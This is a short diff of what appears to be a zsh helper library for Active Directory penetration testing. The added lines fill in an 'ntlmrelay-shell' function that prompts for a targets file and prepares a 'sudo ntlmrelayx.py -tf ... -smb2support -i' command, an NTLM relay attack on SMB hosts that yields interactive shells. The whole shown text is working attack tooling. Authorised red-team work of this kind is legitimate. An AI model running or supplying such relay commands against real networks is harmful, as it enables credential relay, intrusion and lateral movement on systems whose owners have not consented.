@@ -41,7 +41,10 @@ nb-ad-smb-relay-responder() {
 }
 
 nb-ad-smb-relay-ntlmrelay-shell() {
+	__ask "Enter a targets list file"
+	__check-targets
 
+	print -z "sudo ntlmrelayx.py -tf ${__TARGETS} -smb2support -i"
 }
 
 nb-ad-smb-relay-ntlmrelay-command() {
